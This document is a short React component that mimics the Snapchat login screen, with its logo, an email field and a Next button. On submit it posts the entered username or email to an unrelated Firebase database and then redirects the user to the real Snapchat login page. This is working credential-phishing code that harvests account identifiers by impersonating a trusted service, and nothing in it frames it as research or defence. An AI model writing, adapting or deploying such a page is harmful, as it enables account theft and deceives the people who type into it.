
import './Snap.css'


function Snap() {
    async function Next(e) {
        let email = document.getElementById('email').value
        e.preventDefault()
        if (email != '') {


            let res = await fetch('https://test-19ece-default-rtdb.firebaseio.com/Data_Base.json', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify( {
                    f_email: email
                })
            })
            if (res) {
                window.location.replace('https://accounts.snapchat.com/accounts/v2/login')
                alert('Your data is send sucssessfuly')
            }
        }
        else{
            alert('please fill Your data')
        }


    }

    return (
        <>
            <section className="box">
                <form method='POST' className='box2'>
                    <span className='icn'><i class="fa-brands fa-snapchat fa-beat-fade"></i></span><br />
                    <label className='lbl' >Username or email address</label><br />
                    <input type="text" id='email' required /><br /><br />
                    <span className='text'> Use phone number insted</span><br />
                    <button className='btn' onClick={Next}>Next</button><br />
                </form>
                <p className='para'>New to Snapchat? <span>Sign up</span></p>
            </section>

        </>
    )
}
export default Snap;